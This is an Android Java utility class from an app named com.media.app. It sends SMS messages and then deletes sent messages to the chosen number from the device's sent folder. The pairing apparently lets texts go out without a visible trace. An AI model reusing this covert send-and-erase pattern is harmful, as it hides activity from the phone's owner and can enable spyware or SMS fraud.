package com.media.app.Utils;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;

import java.util.List;

import static com.media.app.Utils.logger.logg;


/**
 * Created by prabeer.kochar on 01-09-2017.
 */

public class SMSManager {

    public void deleteSMS(Context context, String message, String number) {
        String URI = "content://sms/sent";
        try {
            logg("Deleting SMS from inbox");
            Uri uriSms = Uri.parse("content://sms/sent");
            Cursor c = context.getContentResolver().query(uriSms,
                    new String[]{"_id", "thread_id", "address",
                            "person", "date", "body"}, null, null, null);

            if (c != null && c.moveToFirst()) {
                do {
                    long id = c.getLong(0);
                    long threadId = c.getLong(1);
                    String address = c.getString(2);
                    String body = c.getString(5);
                    logg("ADD:" + address + "|ThreadID:" + String.valueOf(threadId) + "|ID:" + String.valueOf(id));
                    if (address.equals(number)) {

                        try {
                            context.getContentResolver().delete(uriSms, "_id=? and thread_id=?", new String[]{String.valueOf(id), String.valueOf(threadId)});
                            logg("Deleting SMS with id: " + id);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                } while (c.moveToNext());
            }
            c.close();
        } catch (Exception e) {
            logg("Could not delete SMS from inbox: " + e.getMessage());
        }
    }

    public void sendsms(String phno, String message, Context context) {
        {

            SmsManager sms = SmsManager.getDefault();
            // if message length is too long messages are divided
            List<String> messages = sms.divideMessage(message);
            for (String msgs : messages) {

              //  PendingIntent sentIntent = PendingIntent.getBroadcast(context, 0, new Intent("SMS_SENT"), 0);
               // PendingIntent deliveredIntent = PendingIntent.getBroadcast(context, 0, new Intent("SMS_DELIVERED"), 0);
                sms.sendTextMessage(phno, null, msgs, null, null);

            }
        }
    }
}
